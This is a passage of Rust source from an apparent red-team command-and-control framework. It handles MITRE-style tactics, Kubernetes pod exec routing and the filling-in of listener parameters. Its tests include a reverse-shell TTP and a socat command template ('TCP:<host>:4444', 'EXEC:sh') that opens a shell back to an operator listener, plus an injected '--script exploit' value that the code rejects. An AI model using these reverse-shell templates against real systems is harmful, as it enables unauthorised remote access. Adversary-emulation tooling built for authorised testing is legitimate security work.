        let stale_id = EntityId::new(logical_target);

        // Only proceed when the execution target is a pod with a derived name.
        let Some(exec_pod) = self.entities.find::<Pod>(&stale_id) else {
            return;
        };
        if exec_pod.meta.name_confidence == NameConfidence::Authoritative {
            return;
        }

        let ns = exec_pod.meta.namespace.as_deref().unwrap_or("");
        if ns.is_empty() {
            return;
        }
        let ns_pod_prefix = format!("ns/{}/pod/", ns);

        // Strategy 1: a new Pod entity with an authoritative name appeared in updates.
        let preferred_from_entity = updates
            .new_entities
            .iter()
            .find(|e| {
                if e.entity_kind() != "Pod" {
                    return false;
                }
                let id = e.entity_id();
                if id == stale_id {
                    return false;
                }
                if !id.0.starts_with(&ns_pod_prefix) {
                    return false;
                }
                // Accept any pod in updates whose name is authoritative.
                e.name_confidence() == NameConfidence::Authoritative
            })
            .map(|e| e.entity_id());

        // Strategy 2: a `uses` relation from an authoritative pod appeared in
        // updates (SA token analysis won't re-emit the pod entity if already known).
        let preferred_from_relation = if preferred_from_entity.is_none() {
            updates
                .new_relations
                .iter()
                .filter(|r| r.relation_name() == "uses")
                .map(|r| r.source_id().clone())
                .find(|id| {
                    *id != stale_id
                        && id.0.starts_with(&ns_pod_prefix)
                        && self
                            .entities
                            .find::<Pod>(id)
                            .map(|p| p.meta.name_confidence == NameConfidence::Authoritative)
                            .unwrap_or(false)
                })
        } else {
            None
        };

        let Some(preferred_id) = preferred_from_entity.or(preferred_from_relation) else {
            return;
        };

        tracing::info!(
            stale = %stale_id.0,
            preferred = %preferred_id.0,
            "merging IP-placeholder pod with discovered real pod identity"
        );
        updates.entity_aliases.insert((stale_id, preferred_id));
    }

    fn select_procedure(
        &self,
        ttp: &Ttp,
        procedure_id: Option<&str>,
    ) -> Result<Procedure, ExecuteActionError> {
        if let Some(proc_id) = procedure_id.map(str::trim).filter(|id| !id.is_empty()) {
            return ttp
                .procedures
                .iter()
                .find(|p| p.id == proc_id)
                .cloned()
                .ok_or_else(|| {
                    ExecuteActionError::InvalidInput(format!(
                        "procedure '{}' not found for action '{}'",
                        proc_id, ttp.id
                    ))
                });
        }

        ttp.procedures.first().cloned().ok_or_else(|| {
            ExecuteActionError::InvalidInput(format!("No procedure found for action '{}'", ttp.id))
        })
    }
}

/// Parse a pod entity ID in the canonical form `ns/<namespace>/pod/<name>` and
/// return `(namespace, pod_name)`, or `None` if the format doesn't match.
/// Used to build the inner `kubectl exec` when routing via an intermediate pod.
fn split_pod_entity_id(entity_id: &str) -> Option<(&str, &str)> {
    let mut parts = entity_id.splitn(5, '/');
    let kind_a = parts.next()?;
    let namespace = parts.next()?;
    let kind_b = parts.next()?;
    let pod_name = parts.next()?;
    if parts.next().is_some() {
        return None;
    }
    if kind_a != "ns" || kind_b != "pod" || namespace.is_empty() || pod_name.is_empty() {
        return None;
    }
    Some((namespace, pod_name))
}

/// Returns `true` when the tactic creates a new execution edge rather than
/// requiring one to exist.  For these tactics the command is run FROM an
/// already-compromised source, not TO the target.
fn is_lateral_movement_tactic(tactic: &str) -> bool {
    normalize_tactic(tactic) == "lateral movement"
}

/// Returns `true` when the procedure requires a remote execution channel.
///
/// Local commands (`is_local_command = true`) and operator-side tactics
/// (Reconnaissance, Resource Development) run on the C2 side and do not
/// need a channel to a target system.
fn needs_remote_channel(procedure: &Procedure, tactic: &str) -> bool {
    if procedure.is_local_command == Some(true) {
        return false;
    }
    !matches!(
        normalize_tactic(tactic).as_str(),
        "reconnaissance" | "resource development"
    )
}

fn normalize_tactic(tactic: &str) -> String {
    tactic
        .trim()
        .to_ascii_lowercase()
        .replace(['-', '_'], " ")
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

/// Label for the C2-entry traversal hop, reflecting how the backend reaches the
/// first system: over an established session, via a pod-exec (k8s exec API), or
/// a generic remote exec.
fn entry_relation(backend_id: &str, first_hop: &str) -> &'static str {
    if backend_id.starts_with("session/") {
        "session"
    } else if first_hop.contains("/pod/") {
        "pod-exec"
    } else {
        "exec"
    }
}

fn format_exec_chain(backend_id: &str, hops: &[String], exec_target: &str) -> String {
    let mut parts: Vec<String> = vec![backend_id.to_string()];
    parts.extend(hops.iter().cloned());
    if parts.last().map(|p| p.as_str()) != Some(exec_target) {
        parts.push(exec_target.to_string());
    }
    parts.join(" -> ")
}

static CMD_ID_NONCE: AtomicU64 = AtomicU64::new(1);

fn generate_cmd_id() -> String {
    let millis = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or_default();
    let nonce = CMD_ID_NONCE.fetch_add(1, Ordering::Relaxed);
    format!("cmd-{}-{}", millis, nonce)
}

/// Return the tool name for a procedure, if one is set and non-empty.
fn procedure_tool(procedure: &Procedure) -> Option<&str> {
    procedure.tool.as_deref().filter(|t| !t.trim().is_empty())
}

/// Return the name of the binary a procedure invokes, for use when recording
/// binary presence/absence.
///
/// Resolution order:
/// 1. `procedure.tool` - explicit annotation (e.g. `tool: cat`)
/// 2. `procedure.id` - when it is a single bare word (e.g. key `nmap`, `curl`)
/// 3. First word of `procedure.command` - final fallback
fn procedure_binary_name(procedure: &Procedure) -> Option<&str> {
    if let Some(tool) = procedure_tool(procedure) {
        return Some(tool);
    }

    // Use the procedure ID only when it looks like a bare binary name
    // (no spaces, no path separators).
    let id = procedure.id.trim();
    if !id.is_empty() && !id.contains(' ') && !id.contains('/') {
        return Some(id);
    }

    // Fall back to the first word of the command.
    procedure.command.split_whitespace().next()
}

/// Readiness of an unseen (`Unknown`) tool - a base-rate prior that a tool we
/// haven't checked is present. Below 1.0 so the scorer prefers tools we've
/// *confirmed* present over ones we merely haven't ruled out.
const UNKNOWN_TOOL_READINESS: f32 = 0.7;

/// How runnable a single procedure is on `sys`, in `[0, 1]`:
/// `1.0` if it runs operator-side (no target binary) or its tool is confirmed
/// present, `UNKNOWN_TOOL_READINESS` if the tool's presence is unknown, `0.0` if
/// the tool is known absent.
fn procedure_readiness(procedure: &Procedure, tactic: &str, sys: &ran_domain::SystemInfo) -> f32 {
    if procedure.run_on_target == Some(false) {
        // The execution source is chosen later by the router. Do not hide the
        // action based on the target's binary map, because the target is
        // deliberately excluded from execution and source tool knowledge may
        // still be incomplete.
        return UNKNOWN_TOOL_READINESS;
    }
    if !needs_remote_channel(procedure, tactic) {
        return 1.0; // runs on the C2 side - no target binary required
    }
    match procedure_binary_name(procedure) {
        None => 1.0, // can't identify a binary - don't penalize
        Some(tool) => match sys.has_binary(tool) {
            ran_domain::BinaryPresence::Present(_) => 1.0,
            ran_domain::BinaryPresence::Unknown => UNKNOWN_TOOL_READINESS,
            ran_domain::BinaryPresence::Absent => 0.0,
        },
    }
}

/// Best-case tool readiness for a TTP against `target_id`, i.e. the readiness of
/// the most-runnable procedure (the runtime falls back to whichever procedure
/// can run). Returns `1.0` when the target isn't a system entity (no binary map
/// to assess) or the TTP has no procedures.
///
/// Shared by the applicability gate ([`ttp_tool_satisfied`](crate::ttp_applicability::ttp_tool_satisfied),
/// which treats `> 0.0` as runnable) and the `reliability` consideration (which
/// uses the value to prefer confirmed-runnable actions) so the two never drift.
pub fn best_tool_readiness(ttp: &armory::Ttp, campaign: &Campaign, target_id: &str) -> f32 {
    let Some(sys_ref) = campaign.get_system_entity(target_id) else {
        return 1.0;
    };
    if ttp.procedures.is_empty() {
        return 1.0;
    }
    let sys = sys_ref.entity().system();
    ttp.procedures
        .iter()
        .map(|p| procedure_readiness(p, &ttp.tactic, sys))
        .fold(0.0_f32, f32::max)
}

/// Resolve the first word of `cmd` using a system's binary map.
///
/// If the first word of `cmd` is a known binary with a `Present` path that
/// differs from the bare name (e.g. `kubectl` → `/tmp/kubectl`), the first
/// occurrence of the bare name is replaced with the resolved path.
///
/// Words that already contain `/` are skipped - they are already absolute
/// paths and do not need further resolution.
///
fn ground_binary_in_cmd(
    cmd: &str,
    binaries: &std::collections::HashMap<String, ran_domain::BinaryPresence>,
) -> String {
    use ran_domain::BinaryPresence;

    let first_word = match cmd.split_whitespace().next() {
        Some(w) => w,
        None => return cmd.to_string(),
    };

    // Already an absolute/relative path - nothing to resolve.
    if first_word.contains('/') {
        return cmd.to_string();
    }

    if let Some(BinaryPresence::Present(path)) = binaries.get(first_word) {
        if !path.is_empty() && path.as_str() != first_word {
            // Replace the first occurrence of `first_word` in `cmd`, which is
            // guaranteed to be at a word boundary since it is the first token.
            if let Some(pos) = cmd.find(first_word) {
                let mut result = cmd.to_string();
                result.replace_range(pos..pos + first_word.len(), path.as_str());
                return result;
            }
        }
    }

    cmd.to_string()
}

#[cfg(test)]
mod listener_grounding_tests {
    use std::collections::HashMap;

    use armory::{Procedure, Ttp, TtpParam};
    use c2::BUILTIN_C2_ID;
    use ran_domain::{Entity, EntityId, HostsListener, Listener};

    use super::{ground_listener_defaults, normalize_string_list_params, Campaign};
    use crate::campaign::ExecuteActionError;
    use crate::effects::ground_template;
    use crate::InitialKnowledge;

    fn listener_ttp() -> Ttp {
        Ttp {
            params: vec![TtpParam {
                name: "LISTENER_REF".to_string(),
                param_type: "Listener".to_string(),
                description: String::new(),
                required: true,
                default: String::new(),
                options: vec![],
            }],
            procedures: vec![Procedure::new(
                "shell",
                "connect ${LISTENER} ${LISTENER_PORT}",
            )],
            ..Ttp::new("reverse-shell", "Reverse shell", "Execution")
        }
    }

    fn campaign_with_listener(port: u16) -> (Campaign, Listener) {
        let mut campaign = Campaign::bootstrap_with_knowledge(
            "Ran",
            InitialKnowledge {
                clusters: vec![],
                operator_host_ips: vec!["192.0.2.44".parse().unwrap()],
                ..Default::default()
            },
        );
        let listener = Listener::new(port, "tcp");
        campaign.insert_entity(&listener);
        campaign.insert_relation(&HostsListener::new(
            BUILTIN_C2_ID,
            listener.entity_id().0.clone(),
        ));
        (campaign, listener)
    }

    #[test]
    fn selected_listener_grounds_reachable_host_and_numeric_port() {
        let (campaign, listener) = campaign_with_listener(4444);
        let ttp = listener_ttp();
        let mut args = HashMap::from([
            ("LISTENER_REF".to_string(), listener.entity_id().0),
            ("LISTENER".to_string(), "${LISTENER}".to_string()),
            ("LISTENER_PORT".to_string(), "${LISTENER_PORT}".to_string()),
        ]);

        ground_listener_defaults(&ttp, &mut args, &campaign).unwrap();

        assert_eq!(args["LISTENER"], "192.0.2.44");
        assert_eq!(args["LISTENER_PORT"], "4444");
        let rendered = ground_template(&ttp.procedures[0].command, &args);
        assert!(!rendered.contains("${LISTENER}"));
        assert!(!rendered.contains("${LISTENER_PORT}"));
    }

    #[test]
    fn explicit_listener_host_and_port_are_preserved_without_a_selection() {
        let (campaign, _) = campaign_with_listener(4444);
        let ttp = listener_ttp();
        let mut args = HashMap::from([
            ("LISTENER".to_string(), "callback.example.test".to_string()),
            ("LISTENER_PORT".to_string(), "8443".to_string()),
        ]);

        ground_listener_defaults(&ttp, &mut args, &campaign).unwrap();

        assert_eq!(args["LISTENER"], "callback.example.test");
        assert_eq!(args["LISTENER_PORT"], "8443");
    }

    #[test]
    fn missing_listener_selection_fails_even_when_multiple_listeners_are_active() {
        let (mut campaign, _) = campaign_with_listener(4444);
        let other = Listener::new(5555, "tcp");
        campaign.insert_entity(&other);
        campaign.insert_relation(&HostsListener::new(
            BUILTIN_C2_ID,
            other.entity_id().0.clone(),
        ));
        let ttp = listener_ttp();
        let mut args = HashMap::from([
            ("LISTENER".to_string(), "${LISTENER}".to_string()),
            ("LISTENER_PORT".to_string(), "${LISTENER_PORT}".to_string()),
        ]);

        let error = ground_listener_defaults(&ttp, &mut args, &campaign).unwrap_err();

        assert!(matches!(
            error,
            ExecuteActionError::InvalidInput(reason) if reason.contains("Listener selection")
        ));
        assert_eq!(args["LISTENER"], "${LISTENER}");
        assert_eq!(args["LISTENER_PORT"], "${LISTENER_PORT}");
    }

    #[test]
    fn listener_selection_must_name_an_active_listener_entity() {
        let (campaign, _) = campaign_with_listener(4444);
        let ttp = listener_ttp();
        let mut args = HashMap::from([
            ("LISTENER_REF".to_string(), "listener/tcp/5555".to_string()),
            ("LISTENER".to_string(), "${LISTENER}".to_string()),
        ]);

        let error = ground_listener_defaults(&ttp, &mut args, &campaign).unwrap_err();

        assert!(matches!(
            error,
            ExecuteActionError::InvalidInput(reason) if reason.contains("active Listener entity")
        ));
        assert_eq!(
            EntityId::new("listener/tcp/4444").0,
            "listener/tcp/4444",
            "canonical IDs remain protocol/port based"
        );
    }

    #[test]
    fn listener_tokens_in_json_string_list_defaults_are_grounded() {
        let (campaign, listener) = campaign_with_listener(4444);
        let mut ttp = listener_ttp();
        ttp.params.extend([
            TtpParam {
                name: "LISTENER".to_string(),
                param_type: "string".to_string(),
                description: String::new(),
                required: false,
                default: "${LISTENER}".to_string(),
                options: vec![],
            },
            TtpParam {
                name: "LISTENER_PORT".to_string(),
                param_type: "int".to_string(),
                description: String::new(),
                required: false,
                default: "${LISTENER_PORT}".to_string(),
                options: vec![],
            },
            TtpParam {
                name: "Arguments".to_string(),
                param_type: "stringList".to_string(),
                description: String::new(),
                required: false,
                default: "[\"TCP:${LISTENER}:${LISTENER_PORT}\", \"EXEC:sh\"]".to_string(),
                options: vec![],
            },
        ]);
        ttp.procedures[0].command = "socat {{ Arguments | json_encode }}".to_string();
        let mut args = HashMap::from([
            ("LISTENER_REF".to_string(), listener.entity_id().0),
            ("LISTENER".to_string(), "${LISTENER}".to_string()),
            ("LISTENER_PORT".to_string(), "${LISTENER_PORT}".to_string()),
            (
                "Arguments".to_string(),
                "[\"TCP:${LISTENER}:${LISTENER_PORT}\",\"EXEC:sh\"]".to_string(),
            ),
        ]);

        ground_listener_defaults(&ttp, &mut args, &campaign).unwrap();
        normalize_string_list_params(&ttp, &mut args).unwrap();
        let rendered = ground_template(&ttp.procedures[0].command, &args);

        assert_eq!(args["Arguments"], "[\"TCP:192.0.2.44:4444\",\"EXEC:sh\"]");
        assert!(!rendered.contains("${LISTENER}"));
        assert!(!rendered.contains("${LISTENER_PORT}"));
    }
}

#[cfg(test)]
mod k8s_auth_tests {
    use super::{
        normalize_string_list_params, validate_option_params, ExecuteActionError, ResolvedK8sAuth,
    };
    use armory::{Ttp, TtpParam};
    use std::collections::HashMap;

    #[test]
    fn kubeconfig_auth_grounds_context_flag() {
        let auth = ResolvedK8sAuth::Kubeconfig {
            id: "k8s/credential/staging".to_string(),
            context: Some("staging".to_string()),
            source_path: None,
            source_root: None,
        };
        assert_eq!(
            auth.kubectl_arg(),
            "--kubeconfig \"$KUBECONFIG\" --context staging"
        );
    }

    #[test]
    fn kubeconfig_auth_without_context_omits_flag() {
        let auth = ResolvedK8sAuth::Kubeconfig {
            id: "k8s/credential/prod".to_string(),
            context: None,
            source_path: None,
            source_root: None,
        };
        assert_eq!(auth.kubectl_arg(), "--kubeconfig \"$KUBECONFIG\"");
    }

    #[test]
    fn string_list_parameters_are_normalized_as_json_arrays() {
        let ttp = Ttp {
            params: vec![TtpParam {
                name: "Arguments".to_string(),
                param_type: "stringList".to_string(),
                description: String::new(),
                required: false,
                default: "[]".to_string(),
                options: vec![],
            }],
            ..Ttp::new("test", "Test", "Execution")
        };
        let mut args = HashMap::from([("Arguments".to_string(), r#"["one","two"]"#.to_string())]);

        normalize_string_list_params(&ttp, &mut args).expect("valid list");
        assert_eq!(args["Arguments"], r#"["one","two"]"#);

        args.insert("Arguments".to_string(), "not a list".to_string());
        assert!(normalize_string_list_params(&ttp, &mut args).is_err());
    }

    #[test]
    fn option_parameters_reject_values_outside_the_declared_choices() {
        let ttp = Ttp {
            params: vec![TtpParam {
                name: "SCAN_TYPE".to_string(),
                param_type: "string".to_string(),
                description: String::new(),
                required: true,
                default: "sT".to_string(),
                options: vec!["sT".to_string(), "sV".to_string()],
            }],
            ..Ttp::new("test", "Test", "Discovery")
        };
        let valid = HashMap::from([("SCAN_TYPE".to_string(), "sV".to_string())]);
        let invalid = HashMap::from([("SCAN_TYPE".to_string(), "--script exploit".to_string())]);

        validate_option_params(&ttp, &valid).expect("declared option is valid");
        let error = validate_option_params(&ttp, &invalid).unwrap_err();
        assert!(matches!(
            error,
            ExecuteActionError::InvalidInput(reason) if reason.contains("must be one of: sT, sV")
        ));
    }

    #[test]
    fn option_list_parameters_validate_each_selected_choice() {
        let ttp = Ttp {
            params: vec![TtpParam {
                name: "SCAN_TYPES".to_string(),
                param_type: "stringList".to_string(),
                description: String::new(),
                required: true,
                default: r#"["sT"]"#.to_string(),
                options: vec!["sT".to_string(), "sV".to_string()],
            }],
            ..Ttp::new("test", "Test", "Discovery")
        };
        let valid = HashMap::from([("SCAN_TYPES".to_string(), r#"["sT","sV"]"#.to_string())]);
        let invalid = HashMap::from([("SCAN_TYPES".to_string(), r#"["sT","sS"]"#.to_string())]);

        validate_option_params(&ttp, &valid).expect("declared options are valid");
        assert!(validate_option_params(&ttp, &invalid).is_err());
    }
}
